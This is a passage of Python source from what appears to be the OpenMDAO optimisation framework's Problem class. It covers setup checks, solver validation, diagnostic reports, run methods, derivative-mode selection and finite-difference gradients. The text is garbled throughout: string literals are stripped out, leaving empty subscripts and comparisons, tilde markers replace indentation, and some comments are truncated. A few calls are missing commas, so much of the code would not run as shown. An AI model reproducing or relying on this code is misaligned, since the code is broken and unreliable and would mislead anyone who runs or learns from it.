~~~ tmeta [ ] = idxs \n 
~~ else : \n 
~~~ tmeta [ ] = np . array ( idxs , \n 
dtype = self . _impl . idx_arr_type ) \n 
\n 
# TODO: handle any automatic grouping of systems here... \n 
\n 
#       the full setup over again... \n 
\n 
~~ ~~ ~~ ~~ if MPI : \n 
~~~ for s in self . root . components ( recurse = True ) : \n 
# TODO: get rid of check for setup_distrib_idxs when we move to beta \n 
~~~ if hasattr ( s , ) or ( \n 
hasattr ( s , ) and ( s . setup_distrib \n 
is not Component . setup_distrib ) ) : \n 
# component defines its own setup_distrib, so \n 
# the metadata will change \n 
~~~ meta_changed = True \n 
\n 
# All changes to the system tree or variable metadata \n 
# must be complete at this point. \n 
\n 
# if the system tree has changed, we have to redo the entire setup \n 
~~ ~~ ~~ if tree_changed : \n 
~~~ return self . setup ( check = check , out_stream = out_stream ) \n 
~~ elif meta_changed : \n 
~~~ params_dict , unknowns_dict = self . root . _setup_variables ( compute_indices = True ) \n 
\n 
# perform additional checks on connections \n 
# (e.g. for compatible types and shapes) \n 
~~ self . _setup_errors . extend ( check_connections ( connections , params_dict , \n 
unknowns_dict , \n 
self . root . _sysdata . to_prom_name ) ) \n 
\n 
# calculate unit conversions and store in param metadata \n 
self . _setup_units ( connections , params_dict , unknowns_dict ) \n 
\n 
# propagate top level promoted names, unit conversions, \n 
# and connections down to all subsystems \n 
to_prom_name = self . root . _sysdata . to_prom_name \n 
self . _probdata . to_prom_name = to_prom_name \n 
\n 
for path , meta in iteritems ( params_dict ) : \n 
# set top promoted name into var metadata \n 
~~~ meta [ ] = to_prom_name [ path ] \n 
\n 
# Check for dangling params that have no size or shape \n 
if path not in connections : \n 
~~~ if not in meta or not meta [ ] : \n 
~~~ if meta [ ] == ( ) : \n 
~~~ self . _setup_errors . append ( "Unconnected param \'{}\' is missing " \n 
"a shape or default value." . format ( path ) ) \n 
\n 
~~ ~~ ~~ ~~ for path , meta in iteritems ( unknowns_dict ) : \n 
~~~ meta [ ] = to_prom_name [ path ] \n 
\n 
# Given connection information, create mapping from system pathname \n 
# to the parameters that system must transfer data to \n 
~~ param_owners = _assign_parameters ( connections ) \n 
\n 
pois = self . driver . desvars_of_interest ( ) \n 
oois = self . driver . outputs_of_interest ( ) \n 
\n 
self . _driver_vois = set ( ) \n 
for tup in chain ( pois , oois ) : \n 
~~~ self . _driver_vois . update ( tup ) \n 
\n 
# make sure pois and oois all refer to existing vars. \n 
# NOTE: all variables of interest (includeing POIs) must exist in \n 
#      the unknowns dict \n 
~~ promoted_unknowns = self . root . _sysdata . to_abs_uname \n 
\n 
parallel_p = False \n 
for vnames in pois : \n 
~~~ if len ( vnames ) > 1 : \n 
~~~ parallel_p = True \n 
~~ for v in vnames : \n 
~~~ if v not in promoted_unknowns : \n 
~~~ raise NameError ( "Can\'t find param of interest \'%s\'." % v ) \n 
\n 
~~ ~~ ~~ parallel_u = False \n 
for vnames in oois : \n 
~~~ if len ( vnames ) > 1 : \n 
~~~ parallel_u = True \n 
~~ for v in vnames : \n 
~~~ if v not in promoted_unknowns : \n 
~~~ raise NameError ( "Can\'t find quantity of interest \'%s\'." % v ) \n 
\n 
~~ ~~ ~~ mode = self . _check_for_parallel_derivs ( pois , oois , parallel_u , parallel_p ) \n 
\n 
self . _probdata . relevance = Relevance ( self . root , params_dict , \n 
unknowns_dict , connections , \n 
pois , oois , mode ) \n 
\n 
# perform auto ordering \n 
for s in self . root . subgroups ( recurse = True , include_self = True ) : \n 
# set auto order if order not already set \n 
~~~ if not s . _order_set : \n 
~~~ order = None \n 
broken_edges = None \n 
if self . comm . rank == 0 : \n 
~~~ order , broken_edges = s . list_auto_order ( ) \n 
~~ if MPI : \n 
~~~ if trace : \n 
~~~ debug ( "problem setup order bcast" ) \n 
~~ order , broken_edges = self . comm . bcast ( ( order , broken_edges ) , root = 0 ) \n 
if trace : \n 
~~~ debug ( "problem setup order bcast DONE" ) \n 
~~ ~~ s . set_order ( order ) \n 
\n 
# Mark "head" of each broken edge \n 
for edge in broken_edges : \n 
~~~ cname = edge [ 1 ] \n 
head_sys = self . root \n 
for name in cname . split ( ) : \n 
~~~ head_sys = getattr ( head_sys , name ) \n 
~~ head_sys . _run_apply = True \n 
\n 
# report any differences in units or initial values for \n 
# sourceless connected inputs \n 
~~ ~~ ~~ self . _check_input_diffs ( connections , params_dict , unknowns_dict ) \n 
\n 
\n 
\n 
alloc_derivs = not self . root . fd_options [ ] \n 
for sub in self . root . subgroups ( recurse = True , include_self = True ) : \n 
~~~ alloc_derivs = alloc_derivs or sub . nl_solver . supports [ ] \n 
\n 
# create VecWrappers for all systems in the tree. \n 
~~ self . root . _setup_vectors ( param_owners , impl = self . _impl , alloc_derivs = alloc_derivs ) \n 
\n 
# Prepare Driver \n 
self . driver . _setup ( ) \n 
\n 
# get map of vars to VOI indices \n 
self . _poi_indices , self . _qoi_indices = self . driver . _map_voi_indices ( ) \n 
\n 
# Prepare Solvers \n 
for sub in self . root . subgroups ( recurse = True , include_self = True ) : \n 
~~~ sub . nl_solver . setup ( sub ) \n 
sub . ln_solver . setup ( sub ) \n 
\n 
~~ self . _check_solvers ( ) \n 
\n 
# Prep for case recording and record metadata \n 
self . _start_recorders ( ) \n 
\n 
if self . _setup_errors : \n 
~~~ stream = cStringIO ( ) \n 
stream . write ( "\\nThe following errors occurred during setup:\\n" ) \n 
for err in self . _setup_errors : \n 
~~~ stream . write ( "%s\\n" % err ) \n 
~~ raise RuntimeError ( stream . getvalue ( ) ) \n 
\n 
# Lock any restricted options in the options dictionaries. \n 
~~ OptionsDictionary . locked = True \n 
\n 
# check for any potential issues \n 
if check or force_check : \n 
~~~ return self . check_setup ( out_stream ) \n 
\n 
~~ return { } \n 
\n 
~~ def cleanup ( self ) : \n 
~~~ """ Clean up resources prior to exit. """ \n 
self . driver . cleanup ( ) \n 
self . root . cleanup ( ) \n 
\n 
~~ def _check_solvers ( self ) : \n 
~~~ """ Search over all solvers and raise errors for unsupported\n        configurations. These include:\n\n        Raise an exception if we detect a LinearGaussSeidel\n        solver and that group has either cycles or uniterated states.\n\n        Raise an exception if a Newton solver is found under any system that\n        is set to complex step.\n        """ \n 
\n 
# all states that have some maxiter>1 linear solver above them in the tree \n 
iterated_states = set ( ) \n 
group_states = [ ] \n 
\n 
has_iter_solver = { } \n 
for group in self . root . subgroups ( recurse = True , include_self = True ) : \n 
~~~ try : \n 
~~~ has_iter_solver [ group . pathname ] = ( group . ln_solver . options [ ] > 1 ) \n 
~~ except KeyError : \n 
\n 
# DirectSolver handles coupled derivatives without iteration \n 
~~~ if isinstance ( group . ln_solver , DirectSolver ) : \n 
~~~ has_iter_solver [ group . pathname ] = ( True ) \n 
\n 
# Look for nl solvers that require derivs under Complex Step. \n 
~~ ~~ opt = group . fd_options \n 
if opt [ ] == True and opt [ ] == : \n 
\n 
# TODO: Support using complex step on a subsystem \n 
~~~ if group . name != : \n 
~~~ msg = "Complex step is currently not supported for groups" \n 
msg += " other than root." \n 
self . _setup_errors . append ( msg ) \n 
\n 
# Complex Step, so check for deriv requirement in subsolvers \n 
~~ for sub in self . root . subgroups ( recurse = True , include_self = True ) : \n 
~~~ if hasattr ( sub . nl_solver , ) : \n 
~~~ msg = "The solver in \'{}\' requires derivatives. We " \n 
msg += "currently do not support complex step around it." \n 
self . _setup_errors . append ( msg . format ( sub . name ) ) \n 
\n 
~~ ~~ ~~ parts = group . pathname . split ( ) \n 
for i in range ( len ( parts ) ) : \n 
\n 
~~~ if has_iter_solver [ . join ( parts [ : i ] ) ] : \n 
~~~ is_iterated_somewhere = True \n 
break \n 
~~ ~~ else : \n 
~~~ is_iterated_somewhere = False \n 
\n 
\n 
# ok if we have cycles or states. \n 
~~ if is_iterated_somewhere : \n 
~~~ continue \n 
\n 
~~ if isinstance ( group . ln_solver , LinearGaussSeidel ) and group . ln_solver . options [ ] == 1 : \n 
\n 
\n 
# iterate. \n 
~~~ graph = group . _get_sys_graph ( ) \n 
strong = [ sorted ( s ) for s in nx . strongly_connected_components ( graph ) \n 
if len ( s ) > 1 ] \n 
if strong : \n 
~~~ self . _setup_errors . append ( "Group \'%s\' has a LinearGaussSeidel " \n 
"solver with maxiter==1 but it contains " \n 
"cycles %s. To fix this error, change to " \n 
"a different linear solver, e.g. ScipyGMRES " \n 
"or PetscKSP, or increase maxiter (not " \n 
"recommended)." \n 
% ( group . pathname , strong ) ) \n 
\n 
~~ ~~ states = [ n for n , m in iteritems ( group . _unknowns_dict ) if m . get ( ) ] \n 
if states : \n 
~~~ group_states . append ( ( group , states ) ) \n 
\n 
# this group has an iterative lin solver, so all states in it are ok \n 
if isinstance ( group . ln_solver , DirectSolver ) or group . ln_solver . options [ ] > 1 : \n 
~~~ iterated_states . update ( states ) \n 
~~ else : \n 
# see if any states are in comps that have their own \n 
# solve_linear method \n 
~~~ for s in states : \n 
~~~ if s not in iterated_states : \n 
~~~ cname = s . rsplit ( , 1 ) [ 0 ] \n 
comp = self . root \n 
for name in cname . split ( ) : \n 
~~~ comp = getattr ( comp , name ) \n 
~~ if not _needs_iteration ( comp ) : \n 
~~~ iterated_states . add ( s ) \n 
\n 
~~ ~~ ~~ ~~ ~~ ~~ for group , states in group_states : \n 
~~~ uniterated_states = [ s for s in states if s not in iterated_states ] \n 
\n 
\n 
# iterative linear solver as a parent somewhere in the tree, or they \n 
\n 
\n 
if uniterated_states : \n 
~~~ self . _setup_errors . append ( "Group \'%s\' has a LinearGaussSeidel " \n 
"solver with maxiter==1 but it contains " \n 
"implicit states %s. To fix this error, " \n 
"change to a different linear solver, e.g. " \n 
"ScipyGMRES or PetscKSP, or increase maxiter " \n 
"(not recommended)." % \n 
( group . pathname , uniterated_states ) ) \n 
\n 
~~ ~~ ~~ def _check_dangling_params ( self , out_stream = sys . stdout ) : \n 
~~~ """ Check for parameters that are not connected to a source/unknown.\n        this includes ALL dangling params, both promoted and unpromoted.\n        """ \n 
to_prom_name = self . root . _sysdata . to_prom_name \n 
\n 
dangling_params = sorted ( set ( [ \n 
to_prom_name [ p ] for p , m in iteritems ( self . root . _params_dict ) \n 
if p not in self . root . connections \n 
] ) ) \n 
if dangling_params : \n 
~~~ print ( "\\nThe following parameters have no associated unknowns:" , \n 
file = out_stream ) \n 
for d in dangling_params : \n 
~~~ print ( d , file = out_stream ) \n 
\n 
~~ ~~ return dangling_params \n 
\n 
~~ def _check_mode ( self , out_stream = sys . stdout ) : \n 
~~~ """ Adjoint vs Forward mode appropriateness """ \n 
if self . _calculated_mode != self . root . _probdata . relevance . mode : \n 
~~~ print ( "\\nSpecified derivative mode is \'%s\', but calculated mode is \'%s\'\\n(based " \n 
"on param size of %d and unknown size of %d)" % ( self . root . _probdata . relevance . mode self . _calculated_mode , \n 
self . _p_length , \n 
self . _u_length ) , \n 
file = out_stream ) \n 
\n 
~~ return ( self . root . _probdata . relevance . mode , self . _calculated_mode ) \n 
\n 
~~ def _check_no_unknown_comps ( self , out_stream = sys . stdout ) : \n 
~~~ """ Check for components without unknowns. """ \n 
nocomps = sorted ( [ c . pathname for c in self . root . components ( recurse = True , \n 
local = True ) \n 
if len ( c . unknowns ) == 0 ] ) \n 
if nocomps : \n 
~~~ print ( "\\nThe following components have no unknowns:" , file = out_stream ) \n 
for n in nocomps : \n 
~~~ print ( n , file = out_stream ) \n 
\n 
~~ ~~ return nocomps \n 
\n 
~~ def _check_no_recorders ( self , out_stream = sys . stdout ) : \n 
~~~ """ Check for no case recorder. """ \n 
recorders = [ ] \n 
recorders . extend ( self . driver . recorders ) \n 
for grp in self . root . subgroups ( recurse = True , local = True , \n 
include_self = True ) : \n 
~~~ recorders . extend ( grp . nl_solver . recorders ) \n 
recorders . extend ( grp . ln_solver . recorders ) \n 
\n 
~~ if not recorders : \n 
~~~ print ( "\\nNo recorders have been specified, so no data will be saved." , \n 
file = out_stream ) \n 
\n 
~~ return recorders \n 
\n 
~~ def _check_no_connect_comps ( self , out_stream = sys . stdout ) : \n 
~~~ """ Check for unconnected components. """ \n 
conn_comps = set ( [ t . rsplit ( , 1 ) [ 0 ] \n 
for t in self . root . connections ] ) \n 
conn_comps . update ( [ s . rsplit ( , 1 ) [ 0 ] \n 
for s , i in itervalues ( self . root . connections ) ] ) \n 
noconn_comps = sorted ( [ c . pathname \n 
for c in self . root . components ( recurse = True , local = True ) \n 
if c . pathname not in conn_comps ] ) \n 
if noconn_comps : \n 
~~~ print ( "\\nThe following components have no connections:" , file = out_stream ) \n 
for comp in noconn_comps : \n 
~~~ print ( comp , file = out_stream ) \n 
\n 
~~ ~~ return noconn_comps \n 
\n 
~~ def _check_mpi ( self , out_stream = sys . stdout ) : \n 
~~~ """ Some simple MPI checks. """ \n 
if under_mpirun ( ) : \n 
~~~ parr = True \n 
# Indicate that there are no parallel systems if user is running under MPI \n 
if self . comm . rank == 0 : \n 
~~~ for grp in self . root . subgroups ( recurse = True , include_self = True ) : \n 
~~~ if ( isinstance ( grp , ParallelGroup ) or \n 
isinstance ( grp , ParallelFDGroup ) ) : \n 
~~~ break \n 
~~ ~~ else : \n 
~~~ parr = False \n 
print ( "\\nRunning under MPI, but no ParallelGroups or ParallelFDGroups were found." file = out_stream ) \n 
\n 
~~ mincpu , maxcpu = self . root . get_req_procs ( ) \n 
if maxcpu is not None and self . comm . size > maxcpu : \n 
~~~ print ( "\\nmpirun was given %d MPI processes, but the problem can only use %d" % \n 
( self . comm . size , maxcpu ) ) \n 
\n 
~~ return ( self . comm . size , maxcpu , parr ) \n 
# or any ParalleGroups found when not running under MPI \n 
~~ ~~ else : \n 
~~~ pargrps = [ ] \n 
for grp in self . root . subgroups ( recurse = True , include_self = True ) : \n 
~~~ if isinstance ( grp , ParallelGroup ) : \n 
~~~ print ( "\\nFound ParallelGroup \'%s\', but not running under MPI." % \n 
grp . pathname , file = out_stream ) \n 
pargrps . append ( grp . pathname ) \n 
~~ ~~ return sorted ( pargrps ) \n 
\n 
~~ ~~ def _check_graph ( self , out_stream = sys . stdout ) : \n 
~~~ """ Check for cycles in group w/o solver. """ \n 
cycles = [ ] \n 
ooo = [ ] \n 
\n 
for grp in self . root . subgroups ( recurse = True , include_self = True ) : \n 
~~~ graph = grp . _get_sys_graph ( ) \n 
\n 
strong = [ s for s in nx . strongly_connected_components ( graph ) \n 
if len ( s ) > 1 ] \n 
\n 
if strong : \n 
~~~ relstrong = [ ] \n 
for slist in strong : \n 
~~~ relstrong . append ( [ ] ) \n 
for s in slist : \n 
~~~ relstrong [ - 1 ] . append ( nearest_child ( grp . pathname , s ) ) \n 
# sort the cycle systems in execution order \n 
subs = [ s for s in grp . _subsystems ] \n 
tups = sorted ( [ ( subs . index ( s ) , s ) for s in relstrong [ - 1 ] ] ) \n 
relstrong [ - 1 ] = [ t [ 1 ] for t in tups ] \n 
~~ ~~ print ( "Group \'%s\' has the following cycles: %s" % \n 
( grp . pathname , relstrong ) , file = out_stream ) \n 
cycles . append ( relstrong ) \n 
\n 
# Components/Systems/Groups are not in the right execution order \n 
~~ graph , _ = grp . _break_cycles ( grp . list_order ( ) , graph ) \n 
\n 
visited = set ( ) \n 
out_of_order = { } \n 
for sub in itervalues ( grp . _subsystems ) : \n 
~~~ visited . add ( sub . pathname ) \n 
for u , v in nx . dfs_edges ( graph , sub . pathname ) : \n 
~~~ if v in visited : \n 
~~~ out_of_order . setdefault ( nearest_child ( grp . pathname , v ) , \n 
set ( ) ) . add ( sub . pathname ) \n 
\n 
~~ ~~ ~~ if out_of_order : \n 
# scope ooo names to group \n 
~~~ for name in out_of_order : \n 
~~~ out_of_order [ name ] = sorted ( [ \n 
nearest_child ( grp . pathname , n ) for n in out_of_order [ name ] \n 
] ) \n 
~~ print ( "Group \'%s\' has the following out-of-order subsystems:" % \n 
grp . pathname , file = out_stream ) \n 
for n , subs in iteritems ( out_of_order ) : \n 
~~~ print ( "   %s should run after %s" % ( n , subs ) , file = out_stream ) \n 
~~ ooo . append ( ( grp . pathname , list ( iteritems ( out_of_order ) ) ) ) \n 
print ( "Auto ordering would be: %s" % grp . list_auto_order ( ) [ 0 ] , \n 
file = out_stream ) \n 
\n 
~~ ~~ return ( cycles , sorted ( ooo ) ) \n 
\n 
~~ def _check_gmres_under_mpi ( self , out_stream = sys . stdout ) : \n 
~~~ """ warn when using ScipyGMRES solver under MPI.\n        """ \n 
if under_mpirun ( ) : \n 
~~~ has_parallel = False \n 
for s in self . root . subgroups ( recurse = True , include_self = True ) : \n 
~~~ if isinstance ( s , ParallelGroup ) : \n 
~~~ has_parallel = True \n 
break \n 
\n 
~~ ~~ if has_parallel and isinstance ( self . root . ln_solver , ScipyGMRES ) : \n 
~~~ print ( "\\nScipyGMRES is being used under MPI. Problems can arise " \n 
"if a variable of interest (param/objective/constraint) " \n 
"does not exist in all MPI processes." , file = out_stream ) \n 
\n 
~~ ~~ ~~ def _check_ubcs ( self , out_stream = sys . stdout ) : \n 
~~~ ubcs = self . _get_ubc_vars ( self . root . connections ) \n 
if ubcs : \n 
~~~ print ( "\\nThe following params are connected to unknowns that are " \n 
"updated out of order, so their initial values may contain " \n 
"uninitialized unknown values: %s" % ubcs , file = out_stream ) \n 
~~ return ubcs \n 
\n 
~~ def _check_unmarked_pbos ( self , out_stream = sys . stdout ) : \n 
~~~ pbos = [ ] \n 
for comp in self . root . components ( recurse = True , include_self = True ) : \n 
~~~ if comp . _pbo_warns : \n 
~~~ pbos . append ( ( comp . pathname , comp . _pbo_warns ) ) \n 
\n 
~~ ~~ if pbos : \n 
~~~ print ( "\\nThe following variables are not differentiable but were " \n 
"not labeled by the user as pass_by_obj:" , file = out_stream ) \n 
for cname , pbo_warns in sorted ( pbos , key = lambda x : x [ 0 ] ) : \n 
~~~ for vname , val in pbo_warns : \n 
~~~ print ( "%s: type %s" % ( . join ( ( cname , vname ) ) , \n 
type ( val ) . __name__ ) , file = out_stream ) \n 
\n 
~~ ~~ ~~ return pbos \n 
\n 
~~ def _check_relevant_pbos ( self , out_stream = sys . stdout ) : \n 
~~~ """ Warn if any pass_by_object variables are in any relevant set if\n        top driver requires derivatives.""" \n 
\n 
# Only warn if we are taking gradients across model with a pbo \n 
# variable. \n 
if self . driver . __class__ is Driver or self . driver . supports [ ] is False or self . root . fd_options [ ] : \n 
~~~ return [ ] \n 
\n 
~~ vec = self . root . unknowns \n 
pbos = [ var for var in vec if vec . metadata ( var ) . get ( ) ] \n 
\n 
rels = set ( ) \n 
for key , rel in iteritems ( self . _probdata . relevance . relevant ) : \n 
~~~ rels . update ( rel ) \n 
\n 
~~ rel_pbos = rels . intersection ( pbos ) \n 
if rel_pbos : \n 
~~~ rel_conns = [ ] \n 
\n 
for src in rel_pbos : \n 
# Find target(s) and print whole relevant connection \n 
~~~ for tgt , src_tuple in iteritems ( self . root . connections ) : \n 
~~~ if src_tuple [ 0 ] == src and tgt in rels : \n 
~~~ rel_conns . append ( ( src , tgt ) ) \n 
\n 
~~ ~~ ~~ if rel_conns : \n 
~~~ print ( "\\nThe following relevant connections are marked as pass_by_obj:" , \n 
file = out_stream ) \n 
for src , tgt in rel_conns : \n 
~~~ val = vec [ src ] \n 
print ( "%s -> %s: type %s" % ( src , tgt , type ( val ) . __name__ ) , \n 
file = out_stream ) \n 
~~ ~~ else : \n 
~~~ print ( "\\nThe following pass_by_obj variables are relevant to " \n 
"a derivative calculation:" , sorted ( rel_pbos ) ) \n 
\n 
~~ print ( "\\nYour driver requires a gradient across a model with pass_by_obj " \n 
"connections. We strongly recommend either setting the root " \n 
"fd_options \'force_fd\' to True, or isolating the pass_by_obj " \n 
"connection into a Group and setting its fd_options \'force_fd\' " \n 
"to True." , \n 
file = out_stream ) \n 
\n 
~~ return list ( rel_pbos ) \n 
\n 
~~ def check_setup ( self , out_stream = sys . stdout ) : \n 
~~~ """Write a report to the given stream indicating any potential problems\n        found with the current configuration of this ``Problem``.\n\n        Args\n        ----\n        out_stream : a file-like object, optional\n            Stream where report will be written.\n        """ \n 
print ( "##############################################" , file = out_stream ) \n 
print ( "Setup: Checking for potential issues..." , file = out_stream ) \n 
\n 
results = { } # dict of results for easier testing \n 
results [ ] = self . _check_no_recorders ( out_stream ) \n 
results [ ] = self . _check_mpi ( out_stream ) \n 
results [ ] = self . _check_dangling_params ( out_stream ) \n 
results [ ] = self . _check_mode ( out_stream ) \n 
results [ ] = self . _check_no_unknown_comps ( out_stream ) \n 
results [ ] = self . _check_no_connect_comps ( out_stream ) \n 
results [ ] , results [ ] = self . _check_graph ( out_stream ) \n 
results [ ] = self . _check_ubcs ( out_stream ) \n 
results [ ] = self . _check_gmres_under_mpi ( out_stream ) \n 
results [ ] = self . _check_unmarked_pbos ( out_stream ) \n 
results [ ] = self . _check_relevant_pbos ( out_stream ) \n 
\n 
# TODO: Incomplete optimization driver configuration \n 
# TODO: Parallelizability for users running serial models \n 
# TODO: io state of recorder-specific files? \n 
\n 
# loop over subsystems and let them add any specific checks to the stream \n 
for s in self . root . subsystems ( recurse = True , local = True , include_self = True ) : \n 
~~~ stream = cStringIO ( ) \n 
s . check_setup ( out_stream = stream ) \n 
content = stream . getvalue ( ) \n 
if content : \n 
~~~ print ( "%s:\\n%s\\n" % ( s . pathname , content ) , file = out_stream ) \n 
results [ "@%s" % s . pathname ] = content \n 
\n 
~~ ~~ print ( "\\nSetup: Check complete." , file = out_stream ) \n 
print ( "##############################################\\n" , file = out_stream ) \n 
\n 
return results \n 
\n 
~~ def pre_run_check ( self ) : \n 
~~~ """ Last chance for some checks. The checks that should be performed\n        here are those that would generate a cryptic error message. We can\n        raise a readable error for the user.""" \n 
\n 
# New message if you forget to run setup first. \n 
if not self . root . fd_options . locked : \n 
~~~ msg = "setup() must be called before running the model." \n 
raise RuntimeError ( msg ) \n 
\n 
~~ ~~ def run ( self ) : \n 
~~~ """ Runs the Driver in self.driver. """ \n 
self . pre_run_check ( ) \n 
if self . root . is_active ( ) : \n 
~~~ self . driver . run ( self ) \n 
\n 
\n 
# are finished in order to ensure that scripting code outside of \n 
\n 
# not finished updating.  This can happen with FileRef vars and \n 
# potentially other pass_by_obj variables. \n 
if MPI : \n 
~~~ if trace : debug ( "waiting on problem run() comm.barrier" ) \n 
self . root . comm . barrier ( ) \n 
if trace : debug ( "problem run() comm.barrier DONE" ) \n 
\n 
~~ ~~ ~~ def run_once ( self ) : \n 
~~~ """ Execute run_once in the driver, executing the model at the\n        the current design point. """ \n 
self . pre_run_check ( ) \n 
root = self . root \n 
driver = self . driver \n 
if root . is_active ( ) : \n 
~~~ driver . run_once ( self ) \n 
\n 
# Make sure our residuals are up-to-date \n 
with root . _dircontext : \n 
~~~ root . apply_nonlinear ( root . params , root . unknowns , root . resids , \n 
metadata = driver . metadata ) \n 
\n 
\n 
# are finished in order to ensure that scripting code outside of \n 
\n 
# not finished updating.  This can happen with FileRef vars and \n 
# potentially other pass_by_obj variables. \n 
~~ if MPI : \n 
~~~ if trace : debug ( "waiting on problem run() comm.barrier" ) \n 
root . comm . barrier ( ) \n 
if trace : debug ( "problem run() comm.barrier DONE" ) \n 
\n 
~~ ~~ ~~ def _mode ( self , mode , indep_list , unknown_list ) : \n 
~~~ """ Determine the mode based on precedence. The mode in `mode` is\n        first. If that is \'auto\', then the mode in root.ln_options takes\n        precedence. If that is \'auto\', then mode is determined by the width\n        of the independent variable and quantity space.""" \n 
\n 
self . _p_length = 0 \n 
self . _u_length = 0 \n 
uset = set ( ) \n 
for unames in unknown_list : \n 
~~~ if isinstance ( unames , tuple ) : \n 
~~~ uset . update ( unames ) \n 
~~ else : \n 
~~~ uset . add ( unames ) \n 
~~ ~~ pset = set ( ) \n 
for pnames in indep_list : \n 
~~~ if isinstance ( pnames , tuple ) : \n 
~~~ pset . update ( pnames ) \n 
~~ else : \n 
~~~ pset . add ( pnames ) \n 
\n 
~~ ~~ to_prom_name = self . root . _sysdata . to_prom_name \n 
\n 
for path , meta in chain ( iteritems ( self . root . _unknowns_dict ) , \n 
iteritems ( self . root . _params_dict ) ) : \n 
~~~ prom_name = to_prom_name [ path ] \n 
if prom_name in uset : \n 
~~~ self . _u_length += meta [ ] \n 
uset . remove ( prom_name ) \n 
~~ if prom_name in pset : \n 
~~~ self . _p_length += meta [ ] \n 
pset . remove ( prom_name ) \n 
\n 
~~ ~~ if uset : \n 
~~~ raise RuntimeError ( "Can\'t determine size of unknowns %s." % list ( uset ) ) \n 
~~ if pset : \n 
~~~ raise RuntimeError ( "Can\'t determine size of params %s." % list ( pset ) ) \n 
\n 
# Choose mode based on size \n 
~~ if self . _p_length > self . _u_length : \n 
~~~ self . _calculated_mode = \n 
~~ else : \n 
~~~ self . _calculated_mode = \n 
\n 
~~ if mode == : \n 
~~~ mode = self . root . ln_solver . options [ ] \n 
if mode == : \n 
~~~ mode = self . _calculated_mode \n 
\n 
~~ ~~ return mode \n 
\n 
~~ def calc_gradient ( self , indep_list , unknown_list , mode = , \n 
return_format = , dv_scale = None , cn_scale = None , \n 
sparsity = None ) : \n 
~~~ """ Returns the gradient for the system that is specified in\n        self.root. This function is used by the optimizer but also can be\n        used for testing derivatives on your model.\n\n        Args\n        ----\n        indep_list : iter of strings\n            Iterator of independent variable names that derivatives are to\n            be calculated with respect to. All params must have a IndepVarComp.\n\n        unknown_list : iter of strings\n            Iterator of output or state names that derivatives are to\n            be calculated for. All must be valid unknowns in OpenMDAO.\n\n        mode : string, optional\n            Deriviative direction, can be \'fwd\', \'rev\', \'fd\', or \'auto\'.\n            Default is \'auto\', which uses mode specified on the linear solver\n            in root.\n\n        return_format : string, optional\n            Format for the derivatives, can be \'array\' or \'dict\'.\n\n        dv_scale : dict, optional\n            Dictionary of driver-defined scale factors on the design variables.\n\n        cn_scale : dict, optional\n            Dictionary of driver-defined scale factors on the constraints.\n\n        sparsity : dict, optional\n            Dictionary that gives the relevant design variables for each\n            constraint. This option is only supported in the `dict` return\n            format.\n\n        Returns\n        -------\n        ndarray or dict\n            Jacobian of unknowns with respect to params.\n        """ \n 
if mode not in [ , , , ] : \n 
~~~ msg = "mode must be \'auto\', \'fwd\', \'rev\', or \'fd\'" \n 
raise ValueError ( msg ) \n 
\n 
~~ if return_format not in [ , ] : \n 
~~~ msg = "return_format must be \'array\' or \'dict\'" \n 
raise ValueError ( msg ) \n 
\n 
~~ with self . root . _dircontext : \n 
# Either analytic or finite difference \n 
~~~ if mode == or self . root . fd_options [ ] : \n 
~~~ return self . _calc_gradient_fd ( indep_list , unknown_list , \n 
return_format , dv_scale = dv_scale , \n 
cn_scale = cn_scale , sparsity = sparsity ) \n 
~~ else : \n 
~~~ return self . _calc_gradient_ln_solver ( indep_list , unknown_list , \n 
return_format , mode , \n 
dv_scale = dv_scale , \n 
cn_scale = cn_scale , \n 
sparsity = sparsity ) \n 
\n 
~~ ~~ ~~ def _calc_gradient_fd ( self , indep_list , unknown_list , return_format , \n 
dv_scale = None , cn_scale = None , sparsity = None ) : \n 
~~~ """ Returns the finite differenced gradient for the system that is\n        specified in self.root.\n\n        Args\n        ----\n        indep_list : iter of strings\n            Iterator of independent variable names that derivatives are to\n            be calculated with respect to. All params must have a IndepVarComp.\n\n        unknown_list : iter of strings\n            Iterator of output or state names that derivatives are to\n            be calculated for. All must be valid unknowns in OpenMDAO.\n\n        return_format : string\n            Format for the derivatives, can be \'array\' or \'dict\'.\n\n        dv_scale : dict, optional\n            Dictionary of driver-defined scale factors on the design variables.\n\n        cn_scale : dict, optional\n            Dictionary of driver-defined scale factors on the constraints.\n\n        sparsity : dict, optional\n            Dictionary that gives the relevant design variables for each\n            constraint. This option is only supported in the `dict` return\n            format.\n\n        Returns\n        -------\n        ndarray or dict\n            Jacobian of unknowns with respect to params.\n        """ \n 
root = self . root \n 
unknowns = root . unknowns \n 
params = root . params \n 
\n 
to_prom_name = root . _sysdata . to_prom_name \n 
to_abs_pnames = root . _sysdata . to_abs_pnames \n 
to_abs_uname = root . _sysdata . to_abs_uname \n 
\n 
if dv_scale is None : \n 
~~~ dv_scale = { } \n 
~~ if cn_scale is None : \n 
~~~ cn_scale = { } \n 
\n 
~~ abs_params = [ ] \n 
fd_unknowns = [ var for var in unknown_list if var not in indep_list ] \n 
pass_unknowns = [ var for var in unknown_list if var in indep_list ] \n 
for name in indep_list : \n 
\n 
~~~ if name in unknowns : \n 
~~~ name = to_abs_uname [ name ] \n 
\n 
~~ for tgt , ( src , idxs ) in iteritems ( root . connections ) : \n 
~~~ if name == src : \n 
~~~ name = tgt \n 
break \n 
\n 
~~ ~~ abs_params . append ( name ) \n 
\n 
~~ Jfd = root . fd_jacobian ( params , unknowns , root . resids , total_derivs = True , \n 
fd_params = abs_params , fd_unknowns = fd_unknowns , \n 
pass_unknowns = pass_unknowns , \n 
poi_indices = self . _poi_indices , \n 
qoi_indices = self . _qoi_indices ) \n 
\n 
def get_fd_ikey ( ikey ) : \n 
# FD Input keys are a little funny.... \n 
~~~ if isinstance ( ikey , tuple ) : \n 
~~~ ikey = ikey [ 0 ] \n 
\n 
~~ fd_ikey = ikey \n 
\n 
if fd_ikey not in params : \n 
# The user sometimes specifies the parameter output \n 
# name instead of its target because it is more \n 
# convenient \n 
~~~ for tgt , ( src , idxs ) in iteritems ( root . connections ) : \n 
~~~ if src == ikey : \n 
~~~ fd_ikey = tgt \n 
break \n 
\n 
# We need the absolute name, but the fd Jacobian \n 
# holds relative promoted inputs \n 
~~ ~~ if fd_ikey not in params : \n 
~~~ for key , meta in iteritems ( params ) : \n 
~~~ if to_prom_name [ key ] == fd_ikey : \n 
~~~ fd_ikey = meta [ ] \n 
break \n 
\n 
~~ ~~ ~~ ~~ return fd_ikey \n 
\n 
~~ if return_format == : \n 
~~~ J = OrderedDict ( ) \n 
for okey in unknown_list : \n 
